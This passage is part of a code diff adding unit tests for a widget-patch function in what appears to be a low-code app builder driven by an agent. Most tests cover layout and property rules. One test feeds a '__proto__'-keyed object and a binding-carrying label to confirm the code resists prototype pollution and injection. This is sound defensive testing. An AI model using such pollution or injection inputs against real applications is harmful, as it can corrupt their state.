+      ["StartsAt", { labelTooltip: "<i>when</i>" }],
+    ] as const) {
+      expect(
+        widgetPatchSchema.safeParse({
+          operations: [{ kind: "update", name, props }],
+        }).success,
+      ).toBe(false);
+    }
+
+    const { dsl: patched } = applyWidgetPatch(dsl(), {
+      operations: [
+        {
+          kind: "update",
+          name: "Save",
+          props: { tooltip: "Saves the form (Ctrl+S)" },
+        },
+      ],
+    });
+
+    expect(patched.children![1].tooltip).toBe("Saves the form (Ctrl+S)");
+  });
+
+  it("narrows labelPosition to what each family's pane offers", () => {
+    for (const [name, props] of [
+      ["Agree", { labelPosition: "Top" }],
+      ["Agree", { labelPosition: "Auto" }],
+      ["On", { labelPosition: "Top" }],
+      ["Email", { labelPosition: "Right" }],
+      ["StartsAt", { labelPosition: "Right" }],
+    ] as const) {
+      expect(() =>
+        applyWidgetPatch(dsl(), {
+          operations: [{ kind: "update", name, props }],
+        }),
+      ).toThrow("'labelPosition' on a");
+    }
+
+    expect(() =>
+      applyWidgetPatch(dsl(), {
+        operations: [
+          { kind: "update", name: "Agree", props: { labelPosition: "Right" } },
+          { kind: "update", name: "On", props: { labelPosition: "Left" } },
+          {
+            kind: "update",
+            name: "Email",
+            props: { labelPosition: "Left", labelAlignment: "right" },
+          },
+          {
+            kind: "update",
+            name: "StartsAt",
+            props: { labelPosition: "Auto" },
+          },
+        ],
+      }),
+    ).not.toThrow();
+  });
+});
+
+describe("applyWidgetPatch — every owner-guarded literal is refused outside its owners", () => {
+  // A sample value per non-trivial key; booleans, enums and numbers are derived from the schema.
+  const SAMPLE: Record<string, unknown> = {
+    delimiter: ";",
+    tabOrder: 1,
+    primaryColumnId: "id",
+    defaultNewRow: { a: 1 },
+    defaultSelectedRowIndices: [0],
+    iconName: "tick",
+    labelStyle: "BOLD",
+    fontStyle: "BOLD",
+    defaultSelectedItem: "x",
+    minDate: "2026-01-01",
+    maxDate: "2026-01-02",
+    defaultDate: "2026-01-03",
+    defaultTab: "Tab 1",
+    defaultImage: "https://a.example/x.png",
+    seriesName: "s",
+    xAxisName: "x",
+    yAxisName: "y",
+    defaultSearchText: "q",
+    labelTooltip: "t",
+    tooltip: "t",
+    placeholderText: "p",
+    defaultOptionValue: "v",
+    label: "l",
+    labelText: "l",
+    allowedFileTypes: ["*"],
+    minNum: 0,
+    maxNum: 1,
+    maxZoomLevel: 2,
+  };
+  const COLORS = new Set([
+    "textColor",
+    "backgroundColor",
+    "oddRowColor",
+    "evenRowColor",
+    "cellBackground",
+    "headerRowColor",
+    "headerTextColor",
+    "truncateButtonColor",
+    "borderColor",
+    "accentColor",
+    "buttonColor",
+    "labelTextColor",
+  ]);
+
+  function unwrap(schema: z.ZodTypeAny): z.ZodTypeAny {
+    let current = schema;
+
+    while (
+      current instanceof z.ZodOptional ||
+      current instanceof z.ZodEffects ||
+      current instanceof z.ZodPipeline
+    ) {
+      current =
+        current instanceof z.ZodOptional
+          ? current.unwrap()
+          : current instanceof z.ZodEffects
+            ? current.innerType()
+            : current._def.in;
+    }
+
+    return current;
+  }
+
+  function sampleFor(key: string): unknown {
+    if (key in SAMPLE) return SAMPLE[key];
+
+    if (COLORS.has(key)) return "#000000";
+
+    const schema = unwrap(
+      (
+        widgetPropsPatchSchema._def.schema.shape as Record<string, z.ZodTypeAny>
+      )[key],
+    );
+
+    if (schema instanceof z.ZodBoolean) return true;
+
+    if (schema instanceof z.ZodEnum) return schema.options[0];
+
+    if (schema instanceof z.ZodNumber) return schema.minValue ?? 0;
+
+    return undefined;
+  }
+
+  const ALL_TYPES = [
+    "TEXT_WIDGET",
+    "INPUT_WIDGET_V2",
+    "SELECT_WIDGET",
+    "MULTI_SELECT_WIDGET_V2",
+    "RADIO_GROUP_WIDGET",
+    "CHECKBOX_WIDGET",
+    "SWITCH_WIDGET",
+    "BUTTON_WIDGET",
+    "IMAGE_WIDGET",
+    "TABLE_WIDGET_V2",
+    "CONTAINER_WIDGET",
+    "FORM_WIDGET",
+    "MODAL_WIDGET",
+    "TABS_WIDGET",
+    "LIST_WIDGET_V2",
+    "DATE_PICKER_WIDGET2",
+    "CHART_WIDGET",
+    "FILE_PICKER_WIDGET_V2",
+    "STATBOX_WIDGET",
+    "DIVIDER_WIDGET",
+  ];
+
+  it("throws the owners-named error for each key on a widget type outside its owners", () => {
+    const unsampled: string[] = [];
+
+    for (const [key, owners] of Object.entries(LITERAL_PROP_OWNERS)) {
+      const value = sampleFor(key);
+
+      if (value === undefined) {
+        unsampled.push(key);
+        continue;
+      }
+
+      const outsider = ALL_TYPES.find((type) => !owners.includes(type));
+
+      expect(outsider).toBeDefined();
+
+      const dsl = node({
+        widgetId: "0",
+        widgetName: "MainContainer",
+        type: "CANVAS_WIDGET",
+        children: [node({ widgetId: "w", widgetName: "W", type: outsider! })],
+      });
+
+      expect(() =>
+        applyWidgetPatch(dsl, {
+          operations: [{ kind: "update", name: "W", props: { [key]: value } }],
+        }),
+      ).toThrow(`'${key}' can only be set on`);
+    }
+
+    // Every owners entry must have a sample value, so a new key cannot slip out of this check.
+    expect(unsampled).toEqual([]);
+  });
+});
+
+describe("applyWidgetPatch — slider label position is Left | Top", () => {
+  it("refuses Auto on a slider and accepts Left / Top", () => {
+    const dsl = () =>
+      node({
+        widgetId: "0",
+        widgetName: "MainContainer",
+        type: "CANVAS_WIDGET",
+        children: [
+          node({
+            widgetId: "n",
+            widgetName: "Qty",
+            type: "NUMBER_SLIDER_WIDGET",
+          }),
+        ],
+      });
+
+    expect(() =>
+      applyWidgetPatch(dsl(), {
+        operations: [
+          { kind: "update", name: "Qty", props: { labelPosition: "Auto" } },
+        ],
+      }),
+    ).toThrow("'labelPosition' on a NUMBER_SLIDER_WIDGET must be Left | Top");
+    expect(
+      applyWidgetPatch(dsl(), {
+        operations: [
+          { kind: "update", name: "Qty", props: { labelPosition: "Top" } },
+        ],
+      }).dsl.children![0].labelPosition,
+    ).toBe("Top");
+  });
+});
+
+describe("applyWidgetPatch — resize and move inside 64-column inner canvases", () => {
+  const dsl = () =>
+    node({
+      widgetId: "0",
+      widgetName: "MainContainer",
+      type: "CANVAS_WIDGET",
+      children: [
+        node({
+          widgetId: "f",
+          widgetName: "Filters",
+          type: "CONTAINER_WIDGET",
+          topRow: 0,
+          bottomRow: 20,
+          leftColumn: 0,
+          rightColumn: 32,
+          children: [
+            node({
+              widgetId: "fc",
+              widgetName: "FiltersCanvas",
+              type: "CANVAS_WIDGET",
+              topRow: 0,
+              bottomRow: 20,
+              leftColumn: 0,
+              rightColumn: 64,
+              detachFromLayout: true,
+              children: [
+                node({
+                  widgetId: "i",
+                  widgetName: "Search",
+                  type: "INPUT_WIDGET_V2",
+                  topRow: 1,
+                  bottomRow: 5,
+                  leftColumn: 0,
+                  rightColumn: 64,
+                }),
+              ],
+            }),
+          ],
+        }),
+      ],
+    });
+
+  it("lets a 32-column container shrink although its child spans the full 64-column inner grid", () => {
+    const { dsl: patched } = applyWidgetPatch(dsl(), {
+      operations: [{ kind: "resize", name: "Filters", columns: 24 }],
+    });
+    const filters = patched.children![0];
+    const canvas = filters.children![0];
+
+    expect(filters.rightColumn).toBe(24);
+    // The inner canvas's rightColumn is not the container's span; it is left alone.
+    expect(canvas.rightColumn).toBe(64);
+    expect(canvas.children![0].rightColumn).toBe(64);
+
+    // Rows are still constrained by the children.
+    expect(() =>
+      applyWidgetPatch(dsl(), {
+        operations: [{ kind: "resize", name: "Filters", rows: 3 }],
+      }),
+    ).toThrow("cannot shrink");
+  });
+
+  it("clamps an explicit move position past the canvas edge and records the repair", () => {
+    const {
+      changes,
+      dsl: patched,
+      notes,
+    } = applyWidgetPatch(dsl(), {
+      operations: [
+        {
+          kind: "move",
+          name: "Search",
+          position: { topRow: 1, leftColumn: 100000 },
+        },
+      ],
+    });
+    const search = patched.children![0].children![0].children![0];
+
+    expect(search.leftColumn).toBe(0);
+    expect(search.rightColumn).toBe(64);
+    expect(notes.join(" ")).toContain("past the canvas edge");
+    // The change record reports what the agent asked for, not the clamped value.
+    expect(changes[0]).toMatchObject({
+      kind: "move",
+      requestedPosition: { topRow: 1, leftColumn: 100000 },
+      position: { topRow: 1, leftColumn: 0 },
+    });
+
+    // strict: a past-edge position is refused instead of repaired.
+    expect(() =>
+      applyWidgetPatch(dsl(), {
+        operations: [
+          {
+            kind: "move",
+            name: "Search",
+            position: { topRow: 1, leftColumn: 100000 },
+            strict: true,
+          },
+        ],
+      }),
+    ).toThrow("past the canvas edge");
+  });
+});
+
+describe("applyWidgetPatch — reorderTabs and defaultTab on a Tabs widget", () => {
+  const tabsNode = () =>
+    node({
+      widgetId: "0",
+      widgetName: "MainContainer",
+      type: "CANVAS_WIDGET",
+      children: [
+        node({
+          widgetId: "t",
+          widgetName: "Views",
+          type: "TABS_WIDGET",
+          defaultTab: "Content",
+          tabsObj: {
+            tab1: {
+              id: "tab1",
+              label: "Content",
+              widgetId: "c1",
+              index: 0,
+              isVisible: true,
+            },
+            tab2: {
+              id: "tab2",
+              label: "Schedule",
+              widgetId: "c2",
+              index: 1,
+              isVisible: true,
+            },
+            tab3: {
+              id: "tab3",
+              label: "Audit",
+              widgetId: "c3",
+              index: 2,
+              isVisible: true,
+            },
+          },
+          children: [],
+        }),
+        node({ widgetId: "x", widgetName: "Title", type: "TEXT_WIDGET" }),
+      ],
+    });
+
+  it("reorders the tabs by rewriting their indices and nothing else", () => {
+    const { changes, dsl } = applyWidgetPatch(tabsNode(), {
+      operations: [
+        {
+          kind: "update",
+          name: "Views",
+          props: {
+            reorderTabs: ["Audit", "Content", "Schedule"],
+            defaultTab: "Audit",
+          },
+        },
+      ],
+    });
+    const tabsObj = dsl.children![0].tabsObj as Record<
+      string,
+      { label: string; index: number; widgetId: string; id: string }
+    >;
+
+    expect(tabsObj.tab3).toMatchObject({
+      id: "tab3",
+      label: "Audit",
+      widgetId: "c3",
+      index: 0,
+    });
+    expect(tabsObj.tab1).toMatchObject({
+      id: "tab1",
+      label: "Content",
+      widgetId: "c1",
+      index: 1,
+    });
+    expect(tabsObj.tab2).toMatchObject({
+      id: "tab2",
+      label: "Schedule",
+      widgetId: "c2",
+      index: 2,
+    });
+    expect(dsl.children![0].defaultTab).toBe("Audit");
+    expect([...(changes[0].changedProps ?? [])].sort()).toEqual([
+      "defaultTab",
+      "reorderTabs",
+    ]);
+  });
+
+  it("refuses an order that is not a permutation of the existing tabs, and a defaultTab that is not a tab", () => {
+    for (const [reorderTabs, message] of [
+      [["Audit", "Content"], 'missing: "Schedule"'],
+      [["Audit", "Content", "Schedule", "Extra"], 'not a tab: "Extra"'],
+      [["Audit", "Audit", "Content"], 'repeated: "Audit"'],
+    ] as const) {
+      expect(() =>
+        applyWidgetPatch(tabsNode(), {
+          operations: [
+            {
+              kind: "update",
+              name: "Views",
+              props: { reorderTabs: [...reorderTabs] },
+            },
+          ],
+        }),
+      ).toThrow(message);
+    }
+
+    expect(() =>
+      applyWidgetPatch(tabsNode(), {
+        operations: [
+          { kind: "update", name: "Title", props: { reorderTabs: ["A"] } },
+        ],
+      }),
+    ).toThrow("'reorderTabs' can only be set on TABS_WIDGET");
+    expect(() =>
+      applyWidgetPatch(tabsNode(), {
+        operations: [
+          { kind: "update", name: "Views", props: { defaultTab: "Nope" } },
+        ],
+      }),
+    ).toThrow('\'defaultTab\' "Nope" is not a tab of "Views"');
+
+    // Labels are literal text: a binding is refused by the schema.
+    expect(
+      widgetPatchSchema.safeParse({
+        operations: [
+          {
+            kind: "update",
+            name: "Views",
+            props: { reorderTabs: ["{{ x }}"] },
+          },
+        ],
+      }).success,
+    ).toBe(false);
+  });
+
+  it("refuses to reorder a widget whose tabs share a label, even when the order names each label once", () => {
+    const twins = node({
+      widgetId: "0",
+      widgetName: "MainContainer",
+      type: "CANVAS_WIDGET",
+      children: [
+        node({
+          widgetId: "t",
+          widgetName: "Views",
+          type: "TABS_WIDGET",
+          tabsObj: {
+            a: {
+              id: "a",
+              label: "Same",
+              widgetId: "c1",
+              index: 0,
+              isVisible: true,
+            },
+            b: {
+              id: "b",
+              label: "Same",
+              widgetId: "c2",
+              index: 1,
+              isVisible: true,
+            },
+            c: {
+              id: "c",
+              label: "Other",
+              widgetId: "c3",
+              index: 2,
+              isVisible: true,
+            },
+          },
+          children: [],
+        }),
+      ],
+    });
+
+    // ["Other", "Same"] passes the exact-permutation check (nothing unknown, repeated or missing), so without the
+    // duplicate guard both "Same" tabs would be written index 1.
+    expect(() =>
+      applyWidgetPatch(twins, {
+        operations: [
+          {
+            kind: "update",
+            name: "Views",
+            props: { reorderTabs: ["Other", "Same"] },
+          },
+        ],
+      }),
+    ).toThrow('"Views" has two tabs with the same label');
+    // defaultTab may still name the shared label (the client selects the first match).
+    expect(
+      applyWidgetPatch(twins, {
+        operations: [
+          { kind: "update", name: "Views", props: { defaultTab: "Same" } },
+        ],
+      }).dsl.children![0].defaultTab,
+    ).toBe("Same");
+  });
+
+  it("allows an empty defaultTab (the editor's own 'no default, first tab' value)", () => {
+    expect(
+      applyWidgetPatch(tabsNode(), {
+        operations: [
+          { kind: "update", name: "Views", props: { defaultTab: "" } },
+        ],
+      }).dsl.children![0].defaultTab,
+    ).toBe("");
+  });
+
+  it("never echoes a binding-carrying tab label in an error, and a saved __proto__ tab id cannot pollute", () => {
+    const saved = node({
+      widgetId: "0",
+      widgetName: "MainContainer",
+      type: "CANVAS_WIDGET",
+      children: [
+        node({
+          widgetId: "t",
+          widgetName: "Views",
+          type: "TABS_WIDGET",
+          // An editor-saved tabsObj: a label carrying binding source, and a tab keyed "__proto__" (an own key after
+          // JSON parsing, as the DSL clone produces).
+          tabsObj: JSON.parse(
+            '{"tab1":{"id":"tab1","label":"{{ Q.data.name }}","widgetId":"c1","index":0},' +
+              '"__proto__":{"id":"__proto__","label":"Evil","widgetId":"c2","index":1}}',
+          ),
+          children: [],
+        }),
+      ],
+    });
+
+    let message = "";
+
+    try {
+      applyWidgetPatch(saved, {
+        operations: [
+          { kind: "update", name: "Views", props: { reorderTabs: ["Nope"] } },
+        ],
+      });
+    } catch (error) {
+      message = String(error);
+    }
+
+    expect(message).toContain("<bound label>");
+    expect(message).not.toContain("Q.data");
+
+    // A bound label can never be named by the agent (the schema refuses binding syntax), so such a widget is not
+    // reorderable through MCP. With plain labels, reordering writes the saved entries only, including one keyed
+    // "__proto__"; Object.prototype is untouched.
+    const plain = node({
+      widgetId: "0",
+      widgetName: "MainContainer",
+      type: "CANVAS_WIDGET",
+      children: [
+        node({
+          widgetId: "t",
+          widgetName: "Views",
+          type: "TABS_WIDGET",
+          tabsObj: JSON.parse(
+            '{"tab1":{"id":"tab1","label":"Plain","widgetId":"c1","index":0},' +
+              '"__proto__":{"id":"__proto__","label":"Evil","widgetId":"c2","index":1}}',
+          ),
+          children: [],
+        }),
+      ],
+    });
+    const { dsl } = applyWidgetPatch(plain, {
+      operations: [
+        {
+          kind: "update",
+          name: "Views",
+          props: { reorderTabs: ["Evil", "Plain"] },
+        },
+      ],
+    });
+    const tabsObj = dsl.children![0].tabsObj as Record<
+      string,
+      { index: number }
+    >;
+
+    expect(
+      Object.getOwnPropertyDescriptor(tabsObj, "__proto__")?.value.index,
+    ).toBe(0);
+    expect(tabsObj.tab1.index).toBe(1);
+    expect((Object.prototype as { index?: unknown }).index).toBeUndefined();
+  });
+});
+
+describe("applyWidgetPatch — keyboard tabOrder (the platform Accessibility property)", () => {
+  const dsl = () =>
+    node({
+      widgetId: "0",
+      widgetName: "MainContainer",
+      type: "CANVAS_WIDGET",
+      children: [
+        node({
+          widgetId: "i",
+          widgetName: "Email",
+          type: "INPUT_WIDGET_V2",
+          tabOrder: 3,
+        }),
+        node({ widgetId: "b", widgetName: "Save", type: "BUTTON_WIDGET" }),
+        node({
+          widgetId: "c",
+          widgetName: "Filters",
+          type: "CONTAINER_WIDGET",
+        }),
+        node({ widgetId: "t", widgetName: "Title", type: "TEXT_WIDGET" }),
+        node({ widgetId: "s", widgetName: "Kpi", type: "STATBOX_WIDGET" }),
+      ],
+    });
+
+  it("sets a positive integer on focusable widgets and clears it with null", () => {
+    const { dsl: patched } = applyWidgetPatch(dsl(), {
+      operations: [
+        { kind: "update", name: "Save", props: { tabOrder: 2 } },
+        { kind: "update", name: "Filters", props: { tabOrder: 1 } },
+        { kind: "update", name: "Email", props: { tabOrder: null } },
+      ],
+    });
+    const byName = (name: string) =>
+      patched.children!.find((w) => w.widgetName === name)!;
+
+    expect(byName("Save").tabOrder).toBe(2);
+    expect(byName("Filters").tabOrder).toBe(1);
+    // null clears by deleting the key, as the editor does; absent means automatic order.
+    expect("tabOrder" in byName("Email")).toBe(false);
+
+    for (const tabOrder of [0, -1, 1.5, 1001, "2", "{{ x }}"]) {
+      expect(
+        widgetPatchSchema.safeParse({
+          operations: [{ kind: "update", name: "Save", props: { tabOrder } }],
+        }).success,
+      ).toBe(false);
+    }
+  });
+
+  it("refuses it on display-only widgets the factory hides it from", () => {
+    for (const name of ["Title", "Kpi"]) {
+      expect(() =>
+        applyWidgetPatch(dsl(), {
+          operations: [{ kind: "update", name, props: { tabOrder: 1 } }],
+        }),
+      ).toThrow("'tabOrder' can only be set on");
+    }
+  });
+});
+
+describe("applyWidgetPatch — one update's props are bounded as a whole", () => {
+  it("refuses an update whose props serialise past the cap", () => {
+    const big: Record<string, string> = {};
+
+    for (let i = 0; i < 100; i += 1) big[`c${i}`] = "x".repeat(1_000);
+
+    expect(
+      widgetPatchSchema.safeParse({
+        operations: [
+          { kind: "update", name: "Banners", props: { defaultNewRow: big } },
+        ],
+      }).success,
+    ).toBe(false);
+    expect(
+      widgetPatchSchema.safeParse({
+        operations: [
+          {
+            kind: "update",
+            name: "Banners",
+            props: { defaultNewRow: { c0: "x".repeat(1_000) } },
+          },
         ],
       }).success,
     ).toBe(true);
